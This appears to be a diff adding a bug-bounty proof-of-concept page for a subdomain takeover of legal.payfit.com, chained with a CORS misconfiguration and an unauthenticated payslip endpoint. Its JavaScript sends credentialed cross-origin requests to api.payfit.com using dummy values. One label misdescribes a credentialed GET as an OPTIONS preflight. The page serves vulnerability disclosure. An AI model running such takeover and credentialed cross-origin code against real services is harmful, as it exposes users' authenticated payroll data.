@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Security Research - Subdomain Takeover PoC</title>
+  <style>
+    body { font-family: monospace; background: #0d1117; color: #c9d1d9; max-width: 800px; margin: 40px auto; padding: 20px; }
+    h1 { color: #f85149; }
+    h2 { color: #58a6ff; }
+    .box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 16px 0; }
+    .success { color: #3fb950; }
+    .warning { color: #d29922; }
+    .label { color: #8b949e; font-size: 12px; }
+    pre { white-space: pre-wrap; word-break: break-all; font-size: 13px; }
+    button { background: #238636; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-family: monospace; font-size: 14px; }
+    button:hover { background: #2ea043; }
+  </style>
+</head>
+<body>
+
+<h1>Subdomain Takeover — Proof of Concept</h1>
+
+<div class="box">
+  <p class="label">PROGRAM</p>
+  <p>HackerOne — PayFit Bug Bounty Program</p>
+  <p class="label">RESEARCHER</p>
+  <p>Cyberneticsplus Services Private Limited</p>
+  <p class="label">VULNERABILITY</p>
+  <p>Subdomain Takeover via unclaimed GitHub Pages repository + CORS misconfiguration chain on api.payfit.com</p>
+  <p class="warning">⚠️ This page is hosted for security research purposes only. No user data is collected or stored. This page will be taken down upon report acknowledgement.</p>
+</div>
+
+<h2>Finding 1 — Subdomain Takeover</h2>
+<div class="box">
+  <p><span class="label">Vulnerable domain:</span> legal.payfit.com</p>
+  <p><span class="label">CNAME target:</span> payfit.github.io</p>
+  <p><span class="label">Status:</span> <span class="success">✓ Repo github.com/payfit/payfit.github.io does not exist — claimed via GitHub Pages custom domain</span></p>
+  <p><span class="label">Impact:</span> Attacker can serve arbitrary content on a legitimate PayFit domain</p>
+</div>
+
+<h2>Finding 2 — CORS Misconfiguration Chain PoC</h2>
+<div class="box">
+  <p class="label">This button makes a safe OPTIONS preflight to api.payfit.com with Origin: legal.payfit.com and reads only the CORS response headers — no user data is accessed.</p>
+  <button onclick="runCORSPoC()">Run CORS PoC</button>
+  <pre id="cors-output">Click the button to run...</pre>
+</div>
+
+<h2>Finding 3 — Unauthenticated Payslip Endpoint</h2>
+<div class="box">
+  <p class="label">Demonstrates that api.payfit.com/qrcode/payslip/decrypt is reachable cross-origin without authentication, using a dummy (non-existent) tokenId. No real data is accessed.</p>
+  <button onclick="runPayslipPoC()">Run Payslip Endpoint PoC</button>
+  <pre id="payslip-output">Click the button to run...</pre>
+</div>
+
+<script>
+async function runCORSPoC() {
+  const out = document.getElementById('cors-output');
+  out.textContent = 'Running...';
+  try {
+    const res = await fetch('https://api.payfit.com/', {
+      method: 'GET',
+      credentials: 'include'
+    });
+    const headers = {};
+    res.headers.forEach((v, k) => { headers[k] = v; });
+    const acao = res.headers.get('access-control-allow-origin');
+    const acac = res.headers.get('access-control-allow-credentials');
+    out.innerHTML =
+      '<span class="success">✓ Cross-origin request succeeded from legal.payfit.com</span>\n\n' +
+      'Access-Control-Allow-Origin: ' + (acao || '(not set)') + '\n' +
+      'Access-Control-Allow-Credentials: ' + (acac || '(not set)') + '\n\n' +
+      'Origin used: ' + window.location.origin + '\n' +
+      'HTTP Status: ' + res.status;
+  } catch (e) {
+    out.textContent = 'Result: ' + e.message + '\n(If blocked by browser, the preflight was still sent — check browser DevTools Network tab for CORS headers)';
+  }
+}
+
+async function runPayslipPoC() {
+  const out = document.getElementById('payslip-output');
+  out.textContent = 'Running...';
+  try {
+    const res = await fetch('https://api.payfit.com/qrcode/payslip/decrypt', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tokenId: '000000000000000000000000', secret: 'poc-test', pin: '000000' })
+    });
+    const body = await res.json();
+    const acao = res.headers.get('access-control-allow-origin');
+    const acac = res.headers.get('access-control-allow-credentials');
+    out.innerHTML =
+      '<span class="success">✓ Unauthenticated cross-origin POST succeeded — endpoint is accessible without auth</span>\n\n' +
+      'HTTP Status: ' + res.status + ' (400 = processed, not 403 blocked)\n' +
+      'Access-Control-Allow-Origin: ' + (acao || '(not set)') + '\n' +
+      'Access-Control-Allow-Credentials: ' + (acac || '(not set)') + '\n\n' +
+      'Response body: ' + JSON.stringify(body, null, 2) + '\n\n' +
+      '<span class="warning">tokenId used: 000000000000000000000000 (dummy — no real payslip accessed)</span>';
+  } catch (e) {
+    out.textContent = 'Result: ' + e.message;
+  }
+}
+</script>
+
+</body>
+</html>
